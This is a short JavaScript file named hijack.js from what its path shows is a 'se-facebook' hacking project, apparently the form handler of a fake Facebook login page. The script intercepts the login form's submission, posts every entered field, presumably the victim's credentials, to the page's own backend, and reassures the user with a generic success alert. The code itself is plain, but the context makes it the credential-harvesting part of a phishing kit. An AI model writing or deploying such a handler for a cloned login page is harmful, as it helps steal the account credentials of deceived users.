// filepath: /home/isc-kfc/Duck_Cloud_Project/hacking-projects/se-facebook/public/hijack.js
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();
    let formData = new FormData(this);

    fetch('/api/submit-form', {
        method: "POST",
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log("Response:", data);
        alert("Form submitted successfully!");
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Error submitting form!");
    });
});
